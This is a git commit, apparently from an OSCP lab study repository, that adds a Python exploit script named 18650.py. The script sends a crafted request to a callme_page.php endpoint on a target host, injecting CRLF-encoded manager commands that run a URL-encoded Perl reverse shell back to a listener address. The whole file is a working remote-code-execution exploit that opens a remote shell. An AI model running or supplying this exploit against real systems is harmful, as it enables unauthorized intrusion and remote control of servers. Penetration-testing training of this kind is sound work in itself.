b0c82efa022469a162af0565cd61582b7bb954cf
OSCP2019 <49588376+OSCP2019@users.noreply.github.com>
2019-06-09 16:09:03 +0100

    Create 18650.py

---
+++ 18650.py
@@ -0,0 +1,14 @@
+import urllib2
+import ssl
+
+rhost="10.11.1.217"
+lhost="10.11.0.XXX"
+lport=443
+extension="1000"
+
+# Reverse shell payload
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+urllib2.urlopen('https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A', context=ctx)
